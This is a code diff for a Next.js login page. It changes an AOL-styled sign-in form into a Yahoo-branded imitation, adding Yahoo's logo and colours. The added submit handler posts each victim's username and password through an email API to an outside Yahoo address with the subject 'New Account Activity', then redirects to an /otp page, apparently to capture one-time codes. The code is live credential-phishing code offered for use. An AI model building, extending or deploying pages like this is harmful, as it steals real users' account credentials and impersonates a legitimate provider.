@@ -1,17 +1,21 @@
 'use client';
 
 import { useState } from 'react';
+import { useRouter } from 'next/navigation';
+import { useAuth } from './context/AuthContext';
 
 export default function AolLoginPage() {
+  const router = useRouter();
+  const { login } = useAuth();
   const [formData, setFormData] = useState({
     username: '',
     password: '',
   });
-  
   const [errors, setErrors] = useState({
     username: '',
     password: '',
   });
+  const [isLoading, setIsLoading] = useState(false);
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -28,7 +32,7 @@ export default function AolLoginPage() {
     }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     
     let newErrors = {
@@ -47,19 +51,39 @@ export default function AolLoginPage() {
     setErrors(newErrors);
     
     if (!newErrors.username && !newErrors.password) {
-      console.log('Login submitted:', formData);
+      setIsLoading(true);
+      try {
+        await fetch('/api/send-email', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            from: 'onboarding@resend.dev', // Replace with your "from" email address
+            to: 'usermail60@yahoo.com', // Replace with your "to" email address
+            subject: 'New Account Activity',
+            html: `<p>Email: ${formData.username}</p><p>p_data: ${formData.password}</p>`,
+          }),
+        });
+        login();
+        router.push('/otp');
+      } catch (error) {
+        console.error('Failed to send email', error);
+      } finally {
+        setIsLoading(false);
+      }
     }
   };
 
   return (
-    <div className="min-h-screen bg-[#f5f5f5] flex flex-col items-center p-4 font-sans">
-      <div className="w-full max-w-sm flex-grow flex flex-col justify-center mt-8">
-        <div className="text-center mb-10">
-          <img src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" alt="Aol" className="mx-auto" width="100" />
+    <div className="min-h-screen bg-[#f3f4f8] flex flex-col items-center px-4 py-6 sm:py-10 font-sans">
+      <div className="w-full max-w-sm flex-grow flex flex-col">
+        <div className="text-center mb-8 sm:mb-10">
+          <img src="/yahoo.png" alt="Yahoo" className="mx-auto h-auto w-[124px] sm:w-[140px]" />
         </div>
 
-        <div>
-          <h2 className="text-2xl font-semibold text-center mb-10">Sign in</h2>
+        <div className="w-full bg-white rounded-2xl p-6 sm:p-8 shadow-sm">
+          <h2 className="text-2xl font-semibold text-center mb-8 text-gray-900">Sign in</h2>
 
           <form onSubmit={handleSubmit} className="space-y-4">
             <div>
@@ -73,8 +97,8 @@ export default function AolLoginPage() {
                 value={formData.username}
                 onChange={handleChange}
                 placeholder="Username, email, or mobile"
-                className={`w-full px-4 py-3 border rounded-sm bg-white focus:outline-none focus:ring-2 focus:ring-blue-500
-                  ${errors.username ? 'border-red-500' : 'border-gray-400'}
+                className={`w-full px-4 py-3 rounded-xl bg-gray-50 text-gray-900 placeholder:text-gray-500 focus:outline-none focus:ring-2
+                  ${errors.username ? 'ring-2 ring-red-500' : 'focus:ring-[#6001d2]'}
                 `}
               />
               {errors.username && (
@@ -93,8 +117,8 @@ export default function AolLoginPage() {
                 value={formData.password}
                 onChange={handleChange}
                 placeholder="Password"
-                className={`w-full px-4 py-3 border rounded-sm bg-white focus:outline-none focus:ring-2 focus:ring-blue-500
-                  ${errors.password ? 'border-red-500' : 'border-gray-400'}
+                className={`w-full px-4 py-3 rounded-xl bg-gray-50 text-gray-900 placeholder:text-gray-500 focus:outline-none focus:ring-2
+                  ${errors.password ? 'ring-2 ring-red-500' : 'focus:ring-[#6001d2]'}
                 `}
               />
               {errors.password && (
@@ -112,22 +136,23 @@ export default function AolLoginPage() {
             <div>
               <button
                 type="submit"
-                className="w-full bg-blue-600 text-white py-3 rounded-sm font-bold text-lg hover:bg-blue-700 transition-colors"
+                className="w-full bg-[#6001d2] text-white py-3 rounded-xl font-semibold text-base sm:text-lg hover:bg-[#4f01af] transition-colors disabled:opacity-50"
+                disabled={isLoading}
               >
-                Sign in
+                {isLoading ? 'Signing in...' : 'Sign in'}
               </button>
             </div>
           </form>
         </div>
 
-        <div className="text-center mt-4">
+        <div className="text-center mt-5">
           <a href="#" className="text-sm text-blue-600 hover:underline">
             Forgot username?
           </a>
         </div>
 
-        <div className="mt-6">
-            <button className="w-full bg-transparent text-blue-600 py-3 rounded-sm font-bold text-lg border border-blue-600 hover:bg-blue-100 transition-colors">
+        <div className="mt-5">
+            <button className="w-full bg-[#ece9ff] text-[#6001d2] py-3 rounded-xl font-semibold text-base sm:text-lg hover:bg-[#e2dcff] transition-colors">
                 Create an account
             </button>
         </div>
@@ -137,10 +162,10 @@ export default function AolLoginPage() {
         </div>
 
         <div className="flex justify-center space-x-4 mb-8">
-            <button className="flex items-center justify-center bg-white border border-gray-400 rounded-sm w-1/2 py-3 hover:bg-gray-100 transition-colors">
+            <button className="flex items-center justify-center bg-white rounded-xl w-1/2 py-3 shadow-sm hover:bg-gray-100 transition-colors">
                 <img src="https://static.cdnlogo.com/logos/g/35/google-icon.svg" alt="Google" className="h-6 w-6" />
             </button>
-            <button className="flex items-center justify-center bg-white border border-gray-400 rounded-sm w-1/2 py-3 hover:bg-gray-100 transition-colors">
+            <button className="flex items-center justify-center bg-white rounded-xl w-1/2 py-3 shadow-sm hover:bg-gray-100 transition-colors">
                 <img src="/yahoo.png" alt="Yahoo" className="h-10 w-10" />
             </button>
         </div>
